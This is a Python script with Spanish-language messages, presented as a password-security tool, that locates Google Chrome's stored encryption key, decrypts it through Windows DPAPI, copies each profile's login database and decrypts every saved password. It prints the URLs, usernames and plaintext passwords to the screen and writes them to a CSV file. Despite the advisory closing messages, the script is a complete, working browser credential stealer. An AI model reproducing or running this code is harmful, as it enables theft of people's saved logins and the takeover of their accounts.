#Full Credits to LimerBoy
import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import time

logo = """

           ██████████████                                   
         ██████████████████          d8888b.  .d8b.  .d8888. .d8888. db   d8b   db  .d88b.  d8888b. d8888b.
       ██████          █████         88  `8D d8' `8b 88'  YP 88'  YP 88   I8I   88 .8P  Y8. 88  `8D 88  `8D
      █████              █████       88oodD' 88ooo88 `8bo.   `8bo.   88   I8I   88 88    88 88oobY' 88   88
      █████              █████       88~~~   88~~~88   `Y8b.   `Y8b. Y8   I8I   88 88    88 88`8b   88   88
      █████              █████       88      88   88 db   8D db   8D `8b d8'8b d8' `8b  d8' 88 `88. 88  .8D
      █████              █████       88      YP   YP `8888Y' `8888Y'  `8b8' `8d8'   `Y88P'  88   YD Y8888D'
      █████              █████                              
   ██████████████████████████████    .88b  d88.  .d8b.  d8b   db  .d8b.   d888b  d88888b d8888b.
  ████████████████████████████████   88'YbdP`88 d8' `8b 888o  88 d8' `8b 88' Y8b 88'     88  `8D
  ████████████████████████████████   88  88  88 88ooo88 88V8o 88 88ooo88 88      88ooooo 88oobY'
  ██████████████    ██████████████   88  88  88 88~~~88 88 V8o88 88~~~88 88  ooo 88~~~~~ 88`8b
  █████████████      █████████████   88  88  88 88   88 88  V888 88   88 88. ~8~ 88.     88 `88.
  ██████████████    ██████████████   YP  YP  YP YP   YP VP   V8P YP   YP  Y888P  Y88888P 88   YD
  ███████████████  ███████████████                          
  ████████████████████████████████                          
  ████████████████████████████████   [i] By JohnnixGamer | PasswordManager | CMD | DigitalSecurity
  ████████████████████████████████                          
  ████████████████████████████████   [i] Herramienta de seguridad de contraseñas y encriptaciones
   ██████████████████████████████                              
  
"""

os.system("cls")
print(logo)
print("[-] Buscando rutas de contraseñas almacenadas vulnerables...")
time.sleep(4)

#GLOBAL CONSTANT
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

print("\n[-] Desencriptando...\n")
time.sleep(4)

def get_secret_key():
    try:
        #(1) Get secretkey from chrome local state
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #Remove suffix DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        #(3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        #Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        #(4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""
    
def get_db_connection(chrome_path_login_db):
    try:
        print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome database cannot be found")
        return None
        
if __name__ == '__main__':
    try:
        #Create Dataframe to store passwords
        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index","url","username","password"])
            #(1) Get secret key
            secret_key = get_secret_key()
            #Search user profile or default folder (this is where the encrypted login password is stored)
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
            for folder in folders:
            	#(2) Get ciphertext from sqlite database
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
                conn = get_db_connection(chrome_path_login_db)
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url!="" and username!="" and ciphertext!=""):
                            #(3) Filter the initialisation vector & encrypted password from ciphertext 
                            #(4) Use AES algorithm to decrypt the password
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            print("Sequence: %d"%(index))
                            print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
                            print("="*50)
                            #(5) Save into CSV 
                            csv_writer.writerow([index,url,username,decrypted_password])
                    #Close database connection
                    cursor.close()
                    conn.close()
                    #Delete temp login db
                    os.remove("Loginvault.db")
    except Exception as e:
        print("[ERR] %s"%str(e))
        
print("\n[!] Hemos encontrado contraseñas vulnerables al desencriptar\n")
print("[x] Consejo: No guarde sus contraseñas en google\n")
time.sleep(2)
print("[!] Estas contraseñas estan expuestas con una encriptación debil y de baja seguridad\n")
time.sleep(3)
   
os.system("PAUSE")